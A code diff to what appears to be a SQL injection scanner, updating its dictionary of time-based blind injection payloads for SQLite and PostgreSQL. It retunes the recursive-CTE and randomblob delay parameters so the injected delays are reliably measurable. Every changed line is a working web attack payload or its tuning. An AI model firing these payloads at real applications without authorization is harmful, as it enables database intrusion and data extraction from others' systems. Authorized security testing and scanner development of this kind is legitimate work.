@@ -62,10 +62,10 @@ TIME_PAYLOADS: dict[str, List[str]] = {
         "')) AND pg_sleep({delay})-- -",
     ],
     "sqlite": [
-        # WITH RECURSIVE is reliable in containerised SQLite where randomblob is too fast
-        "' AND (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt WHERE x<{bench}) SELECT COUNT(*) FROM cnt)>0-- -",
-        "') AND (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt WHERE x<{bench}) SELECT COUNT(*) FROM cnt)>0-- -",
-        "' AND randomblob({blob_size})-- -",   # fallback: large randomblob
+        # WITH RECURSIVE spins the CPU without hitting SQLite's blob-size limit
+        "' AND (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt WHERE x<{sqlite_bench}) SELECT COUNT(*) FROM cnt)>0-- -",
+        "') AND (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt WHERE x<{sqlite_bench}) SELECT COUNT(*) FROM cnt)>0-- -",
+        "' AND randomblob({blob_size})-- -",   # fallback: smaller randomblob
         "') AND randomblob({blob_size})-- -",
         "')) AND randomblob({blob_size})-- -",
         "')) AND randomblob({blob_size}) --",
@@ -78,11 +78,12 @@ TIME_PAYLOADS: dict[str, List[str]] = {
 
 
 def get_time_payloads(dbms: str, delay: int) -> List[str]:
-    """Return time-based payloads with {delay} and {bench}/{blob_size} substituted."""
+    """Return time-based payloads with {delay} and {bench}/{blob_size}/{sqlite_bench} substituted."""
     raw = TIME_PAYLOADS.get(dbms, TIME_PAYLOADS["auto"])
-    bench = delay * 5_000_000        # MySQL BENCHMARK iterations
-    blob_size = delay * 350_000_000  # SQLite randomblob bytes (~0.35s per MB in Docker)
+    bench = delay * 5_000_000         # MySQL/Oracle BENCHMARK iterations
+    sqlite_bench = delay * 10_000_000 # SQLite CTE counter limit (~3.8s per 30M on typical hardware)
+    blob_size = delay * 100_000_000   # SQLite randomblob bytes (capped well below SQLite's 1GB limit)
     return [
-        p.format(delay=delay, bench=bench, blob_size=blob_size)
+        p.format(delay=delay, bench=bench, sqlite_bench=sqlite_bench, blob_size=blob_size)
         for p in raw
     ]
